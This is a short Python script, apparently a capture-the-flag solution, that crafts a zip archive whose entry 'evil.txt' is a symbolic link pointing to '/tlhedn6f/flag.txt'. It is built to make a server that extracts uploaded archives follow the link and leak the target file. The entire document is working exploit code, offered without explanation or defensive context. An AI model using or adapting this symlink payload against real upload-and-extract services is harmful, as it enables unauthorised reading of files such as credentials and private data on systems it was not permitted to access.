import requests
import io
import zipfile
import stat

def create_zip(target_file):
    payload = io.BytesIO()
    zipInfo = zipfile.ZipInfo('evil.txt')
    zipInfo.create_system=3
    unix_st_mode = stat.S_IFLNK | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH
    zipInfo.external_attr = unix_st_mode << 16
    zipOut = zipfile.ZipFile(payload, 'w', compression=zipfile.ZIP_DEFLATED)
    zipOut.writestr(zipInfo, target_file)
    zipOut.close()
    return payload.getvalue()

with open('newfile.zip','wb') as f:
        f.write(create_zip('/tlhedn6f/flag.txt'))
